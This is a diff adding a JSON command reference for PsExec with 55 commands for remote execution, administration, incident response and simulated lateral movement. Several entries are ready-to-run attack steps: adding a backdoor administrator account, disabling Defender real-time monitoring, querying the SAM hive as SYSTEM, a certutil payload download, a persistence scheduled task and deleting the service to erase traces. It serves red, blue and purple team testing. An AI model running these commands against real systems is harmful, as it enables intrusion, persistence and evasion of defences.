@@ -1,0 +1,392 @@
+{
+    "tool": "psexec",
+    "description": "Complete PsExec command and workflow reference from basic to advanced remote execution and lateral movement",
+    "total_commands": 55,
+    "commands": [
+        {
+            "id": 1,
+            "category": "Basic Remote Execution",
+            "command": "psexec \\\\192.168.1.10 cmd",
+            "example": "psexec \\\\192.168.1.10 cmd",
+            "explanation": "Executes an interactive command prompt on the target system using current credentials."
+        },
+        {
+            "id": 2,
+            "category": "Basic Remote Execution",
+            "command": "psexec \\\\192.168.1.10 ipconfig /all",
+            "example": "psexec \\\\192.168.1.10 ipconfig /all",
+            "explanation": "Runs a single non-interactive command remotely and displays the output locally."
+        },
+        {
+            "id": 3,
+            "category": "Authentication Handling",
+            "command": "psexec \\\\192.168.1.10 -u Administrator -p Password123 cmd",
+            "example": "psexec \\\\192.168.1.10 -u Administrator -p Password123 cmd",
+            "explanation": "Connects to the remote host using explicit plaintext credentials."
+        },
+        {
+            "id": 4,
+            "category": "Authentication Handling",
+            "command": "psexec \\\\192.168.1.10 -u DOMAIN\\User -p Password123 cmd",
+            "example": "psexec \\\\192.168.1.10 -u CORP\\Admin -p SecurePass! cmd",
+            "explanation": "Connects using domain credentials for authentication."
+        },
+        {
+            "id": 5,
+            "category": "Automation",
+            "command": "psexec -accepteula \\\\192.168.1.10 cmd",
+            "example": "psexec -accepteula \\\\192.168.1.10 cmd",
+            "explanation": "Automatically accepts the Sysinternals EULA to prevent interactive pop-ups during automation."
+        },
+        {
+            "id": 6,
+            "category": "Privilege Escalation",
+            "command": "psexec \\\\192.168.1.10 -s cmd",
+            "example": "psexec \\\\192.168.1.10 -s cmd",
+            "explanation": "Runs the remote command shell under the NT AUTHORITY\\SYSTEM account."
+        },
+        {
+            "id": 7,
+            "category": "Interactive Sessions",
+            "command": "psexec \\\\192.168.1.10 -i cmd",
+            "example": "psexec \\\\192.168.1.10 -i cmd",
+            "explanation": "Runs the program so that it interacts with the desktop of the specified session on the remote system."
+        },
+        {
+            "id": 8,
+            "category": "Interactive Sessions",
+            "command": "psexec \\\\192.168.1.10 -i -s cmd",
+            "example": "psexec \\\\192.168.1.10 -i -s cmd",
+            "explanation": "Launches an interactive command prompt as the SYSTEM account, visible on the remote desktop."
+        },
+        {
+            "id": 9,
+            "category": "Interactive Sessions",
+            "command": "psexec \\\\192.168.1.10 -i 2 cmd",
+            "example": "psexec \\\\192.168.1.10 -i 2 cmd",
+            "explanation": "Executes the command specifically on session ID 2 on the remote machine."
+        },
+        {
+            "id": 10,
+            "category": "File Execution",
+            "command": "psexec \\\\192.168.1.10 -c test.exe",
+            "example": "psexec \\\\192.168.1.10 -c C:\\Tools\\payload.exe",
+            "explanation": "Copies the specified executable to the remote system and runs it."
+        },
+        {
+            "id": 11,
+            "category": "File Execution",
+            "command": "psexec \\\\192.168.1.10 -c -f test.exe",
+            "example": "psexec \\\\192.168.1.10 -c -f C:\\Tools\\payload.exe",
+            "explanation": "Forces the copy of the executable to the remote system even if the file already exists."
+        },
+        {
+            "id": 12,
+            "category": "File Execution",
+            "command": "psexec \\\\192.168.1.10 -c -v test.exe",
+            "example": "psexec \\\\192.168.1.10 -c -v C:\\Tools\\payload.exe",
+            "explanation": "Copies the file only if the local version has a higher version number or is newer."
+        },
+        {
+            "id": 13,
+            "category": "Performance Control",
+            "command": "psexec \\\\192.168.1.10 -d cmd",
+            "example": "psexec \\\\192.168.1.10 -d C:\\Windows\\System32\\calc.exe",
+            "explanation": "Runs the process non-interactively and does not wait for it to terminate."
+        },
+        {
+            "id": 14,
+            "category": "Priority Management",
+            "command": "psexec \\\\192.168.1.10 -low cmd",
+            "example": "psexec \\\\192.168.1.10 -low batch_job.bat",
+            "explanation": "Starts the remote process with Low priority."
+        },
+        {
+            "id": 15,
+            "category": "Priority Management",
+            "command": "psexec \\\\192.168.1.10 -high cmd",
+            "example": "psexec \\\\192.168.1.10 -high critical_task.exe",
+            "explanation": "Starts the remote process with High priority."
+        },
+        {
+            "id": 16,
+            "category": "Environment Control",
+            "command": "psexec \\\\192.168.1.10 -w C:\\Temp cmd",
+            "example": "psexec \\\\192.168.1.10 -w C:\\Windows\\Temp cmd /c dir",
+            "explanation": "Sets the working directory of the process on the remote system."
+        },
+        {
+            "id": 17,
+            "category": "Environment Control",
+            "command": "psexec \\\\192.168.1.10 -e cmd",
+            "example": "psexec \\\\192.168.1.10 -e cmd",
+            "explanation": "Does not load the specified user's profile during execution."
+        },
+        {
+            "id": 18,
+            "category": "Security Context",
+            "command": "psexec \\\\192.168.1.10 -l cmd",
+            "example": "psexec \\\\192.168.1.10 -l cmd",
+            "explanation": "Runs the process with Limited User rights (strips administrators group token)."
+        },
+        {
+            "id": 19,
+            "category": "Connection Configuration",
+            "command": "psexec \\\\192.168.1.10 -n 10 cmd",
+            "example": "psexec \\\\192.168.1.10 -n 10 cmd",
+            "explanation": "Sets a connection timeout of 10 seconds for connecting to the remote machine."
+        },
+        {
+            "id": 20,
+            "category": "Service Customization",
+            "command": "psexec \\\\192.168.1.10 -r MyService cmd",
+            "example": "psexec \\\\192.168.1.10 -r LatMovSvc cmd",
+            "explanation": "Specifies a custom name for the remote service created by PsExec (default is PSEXESVC)."
+        },
+        {
+            "id": 21,
+            "category": "Lateral Movement Simulation",
+            "command": "psexec \\\\192.168.1.10 -s net user",
+            "example": "psexec \\\\192.168.1.10 -s net user",
+            "explanation": "Enumerates local users on the target as SYSTEM, simulating reconnaissance."
+        },
+        {
+            "id": 22,
+            "category": "Lateral Movement Simulation",
+            "command": "psexec \\\\192.168.1.10 -s reg query HKLM\\SAM",
+            "example": "psexec \\\\192.168.1.10 -s reg query HKLM\\SAM",
+            "explanation": "Attempts to query sensitive registry hives remotely as SYSTEM."
+        },
+        {
+            "id": 23,
+            "category": "Lateral Movement Simulation",
+            "command": "psexec \\\\192.168.1.10 -s powershell -NoP -Command \"whoami\"",
+            "example": "psexec \\\\192.168.1.10 -s powershell -NoP -Command \"whoami\"",
+            "explanation": "Executes PowerShell commands remotely as SYSTEM without loading a profile."
+        },
+        {
+            "id": 24,
+            "category": "Multi-Host Targeting",
+            "command": "psexec @hosts.txt cmd",
+            "example": "psexec @C:\\Ops\\targets.txt ipconfig",
+            "explanation": "Executes the command on every host listed in the specified text file."
+        },
+        {
+            "id": 25,
+            "category": "Multi-Host Targeting",
+            "command": "psexec \\\\* cmd",
+            "example": "psexec \\\\* cmd /c echo check",
+            "explanation": "Runs the command on all computers in the current domain."
+        },
+        {
+            "id": 26,
+            "category": "Logging and Redirection",
+            "command": "psexec \\\\192.168.1.10 cmd > output.txt",
+            "example": "psexec \\\\192.168.1.10 ipconfig > C:\\Logs\\remote_ip.txt",
+            "explanation": "Redirects the standard output of the remote command to a local file."
+        },
+        {
+            "id": 27,
+            "category": "Logging and Redirection",
+            "command": "psexec \\\\192.168.1.10 cmd 2> error.txt",
+            "example": "psexec \\\\192.168.1.10 script.bat 2> C:\\Logs\\errors.log",
+            "explanation": "Redirects the standard error of the remote command to a local file."
+        },
+        {
+            "id": 28,
+            "category": "Blue Team Testing",
+            "command": "psexec -s \\\\192.168.1.10 certutil -urlcache -split -f http://example.com/file",
+            "example": "psexec -s \\\\192.168.1.10 certutil -urlcache -split -f http://192.168.1.5/payload",
+            "explanation": "Simulates ingress tool transfer behavior using certutil via PsExec."
+        },
+        {
+            "id": 29,
+            "category": "Blue Team Testing",
+            "command": "psexec \\\\192.168.1.10 -h cmd",
+            "example": "psexec \\\\192.168.1.10 -h cmd",
+            "explanation": "Runs the process with the account's elevated token (if available)."
+        },
+        {
+            "id": 30,
+            "category": "Process Isolation",
+            "command": "psexec \\\\192.168.1.10 -x cmd",
+            "example": "psexec \\\\192.168.1.10 -x cmd",
+            "explanation": "Displays the UI on the Winlogon secure desktop (system only)."
+        },
+        {
+            "id": 31,
+            "category": "Processor Affinity",
+            "command": "psexec \\\\192.168.1.10 -a 1 cmd",
+            "example": "psexec \\\\192.168.1.10 -a 1 stress_test.exe",
+            "explanation": "Forces the process to run on specific processors (CPU affinity)."
+        },
+        {
+            "id": 32,
+            "category": "Advanced Workflow",
+            "command": "psexec \\\\192.168.1.10 -u Admin -p Pass -h -d -c payload.bat",
+            "example": "psexec \\\\192.168.1.10 -u Admin -p Pass -h -d -c setup.bat",
+            "explanation": "Copies a script, executes it elevated, detached, using explicit credentials."
+        },
+        {
+            "id": 33,
+            "category": "Advanced Workflow",
+            "command": "psexec \\\\192.168.1.10 -s -i -d cmd /c \"echo owned > C:\\flag.txt\"",
+            "example": "psexec \\\\192.168.1.10 -s -i -d cmd /c \"echo test > C:\\Windows\\Temp\\check.txt\"",
+            "explanation": "Non-blocking execution of a one-liner as SYSTEM to create a file artifact."
+        },
+        {
+            "id": 34,
+            "category": "Detection Testing",
+            "command": "psexec -r CustomSvcName \\\\192.168.1.10 cmd",
+            "example": "psexec -r EvilService \\\\192.168.1.10 cmd",
+            "explanation": "Changes the service name to test if detection rules alert on non-standard PSEXESVC names."
+        },
+        {
+            "id": 35,
+            "category": "Interactive GUI Test",
+            "command": "psexec -s -i 1 \\\\192.168.1.10 notepad.exe",
+            "example": "psexec -s -i 1 \\\\192.168.1.10 notepad.exe",
+            "explanation": "Launches a GUI application (Notepad) on the user's desktop session as SYSTEM."
+        },
+        {
+            "id": 36,
+            "category": "Batch Execution",
+            "command": "psexec @servers.txt -u Domain\\Admin -p Pass -d -n 5 cmd /c hostname",
+            "example": "psexec @list.txt -u Corp\\Admin -p Pass -d -n 5 cmd /c hostname",
+            "explanation": "Rapidly fires a hostname check across a list of servers with a short timeout and detach mode."
+        },
+        {
+            "id": 37,
+            "category": "Network Testing",
+            "command": "psexec \\\\192.168.1.10 ipconfig /flushdns",
+            "example": "psexec \\\\192.168.1.10 ipconfig /flushdns",
+            "explanation": "Remotely flushes the DNS cache on the target system."
+        },
+        {
+            "id": 38,
+            "category": "Incident Response",
+            "command": "psexec \\\\192.168.1.10 tasklist",
+            "example": "psexec \\\\192.168.1.10 tasklist",
+            "explanation": "Retrieves the list of running processes from the remote host for analysis."
+        },
+        {
+            "id": 39,
+            "category": "Incident Response",
+            "command": "psexec \\\\192.168.1.10 netstat -anob",
+            "example": "psexec \\\\192.168.1.10 netstat -anob",
+            "explanation": "Retrieves active network connections and associated binaries from the remote host."
+        },
+        {
+            "id": 40,
+            "category": "Incident Response",
+            "command": "psexec -s \\\\192.168.1.10 wmic qfe list",
+            "example": "psexec -s \\\\192.168.1.10 wmic qfe list",
+            "explanation": "Lists installed patches and hotfixes on the remote host as SYSTEM."
+        },
+        {
+            "id": 41,
+            "category": "Red Team Ops",
+            "command": "psexec -s \\\\192.168.1.10 cmd /c \"net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add\"",
+            "example": "psexec -s \\\\192.168.1.10 cmd /c \"net user backdoor P@ssw0rd123 /add\"",
+            "explanation": "Simulates persistence creation by adding a backdoor user via a single command line."
+        },
+        {
+            "id": 42,
+            "category": "Red Team Ops",
+            "command": "psexec -s \\\\192.168.1.10 powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
+            "example": "psexec -s \\\\192.168.1.10 powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
+            "explanation": "Simulates disabling Windows Defender real-time monitoring remotely."
+        },
+        {
+            "id": 43,
+            "category": "Force Disconnect",
+            "command": "psexec \\\\192.168.1.10 -f cmd",
+            "example": "psexec \\\\192.168.1.10 -f cmd",
+            "explanation": "Uses the force flag if the program is already running (rarely used for cmd, useful for services)."
+        },
+        {
+            "id": 44,
+            "category": "Complex Chaining",
+            "command": "psexec \\\\192.168.1.10 -u User -p Pass cmd /c \"ping 127.0.0.1 -n 5 > nul && whoami\"",
+            "example": "psexec \\\\192.168.1.10 -u User -p Pass cmd /c \"ping 127.0.0.1 -n 5 > nul && whoami\"",
+            "explanation": " executes a delayed command sequence to test timeout handling and output buffering."
+        },
+        {
+            "id": 45,
+            "category": "Purple Team Validation",
+            "command": "psexec \\\\192.168.1.10 -c -f -s PsExec.exe",
+            "example": "psexec \\\\192.168.1.10 -c -f -s PsExec.exe",
+            "explanation": "Copies PsExec itself to the target to simulate nested lateral movement (PsExec via PsExec)."
+        },
+        {
+            "id": 46,
+            "category": "Credential Testing",
+            "command": "psexec \\\\192.168.1.10 -u \"\" -p \"\" cmd",
+            "example": "psexec \\\\192.168.1.10 -u \"\" -p \"\" cmd",
+            "explanation": "Attempts to connect using a null session or existing implicit token."
+        },
+        {
+            "id": 47,
+            "category": "Cleanup Simulation",
+            "command": "psexec \\\\192.168.1.10 cmd /c \"sc delete PSEXESVC\"",
+            "example": "psexec \\\\192.168.1.10 cmd /c \"sc delete PSEXESVC\"",
+            "explanation": "Manually attempts to delete the PsExec service to simulate trace removal."
+        },
+        {
+            "id": 48,
+            "category": "Cross-Domain",
+            "command": "psexec \\\\192.168.1.10 -u TARGETDOMAIN\\Administrator -p Password cmd",
+            "example": "psexec \\\\192.168.1.10 -u OTHER\\Admin -p Pass cmd",
+            "explanation": "Executes commands using credentials from a different trust domain."
+        },
+        {
+            "id": 49,
+            "category": "Load Profile",
+            "command": "psexec \\\\192.168.1.10 -i -u User -p Pass -e cmd",
+            "example": "psexec \\\\192.168.1.10 -i -u User -p Pass -e cmd",
+            "explanation": "Explicitly avoids loading the user profile while running interactively."
+        },
+        {
+            "id": 50,
+            "category": "Blue Team Alerting",
+            "command": "psexec \\\\192.168.1.10 powershell -enc JABiACAAPQAgADEAMgAzAA==",
+            "example": "psexec \\\\192.168.1.10 powershell -enc JABiACAAPQAgADEAMgAzAA==",
+            "explanation": "Runs encoded PowerShell commands remotely to trigger obfuscation detection rules."
+        },
+        {
+            "id": 51,
+            "category": "Environment Variables",
+            "command": "psexec \\\\192.168.1.10 cmd /c \"set\"",
+            "example": "psexec \\\\192.168.1.10 cmd /c \"set\"",
+            "explanation": "Dumps remote environment variables to verify the execution context."
+        },
+        {
+            "id": 52,
+            "category": "Registry Modification",
+            "command": "psexec -s \\\\192.168.1.10 reg add HKLM\\Software\\Test /v Data /t REG_SZ /d \"Lateral\" /f",
+            "example": "psexec -s \\\\192.168.1.10 reg add HKLM\\Software\\Test /v Data /t REG_SZ /d \"Lateral\" /f",
+            "explanation": "Adds a registry key remotely as SYSTEM to test EDR registry monitoring."
+        },
+        {
+            "id": 53,
+            "category": "Scheduled Task Simulation",
+            "command": "psexec \\\\192.168.1.10 schtasks /create /tn \"EvilTask\" /tr calc.exe /sc once /st 00:00",
+            "example": "psexec \\\\192.168.1.10 schtasks /create /tn \"EvilTask\" /tr calc.exe /sc once /st 00:00",
+            "explanation": "Uses PsExec to remotely create a scheduled task, a common persistence technique."
+        },
+        {
+            "id": 54,
+            "category": "Account Discovery",
+            "command": "psexec \\\\192.168.1.10 net localgroup administrators",
+            "example": "psexec \\\\192.168.1.10 net localgroup administrators",
+            "explanation": "Queries the local administrators group on the remote host."
+        },
+        {
+            "id": 55,
+            "category": "Share Access",
+            "command": "psexec \\\\192.168.1.10 cmd /c \"dir \\\\127.0.0.1\\C$\"",
+            "example": "psexec \\\\192.168.1.10 cmd /c \"dir \\\\127.0.0.1\\C$\"",
+            "explanation": "Verifies access to administrative shares (C$) from the remote execution context."
+        }
+    ]
+}
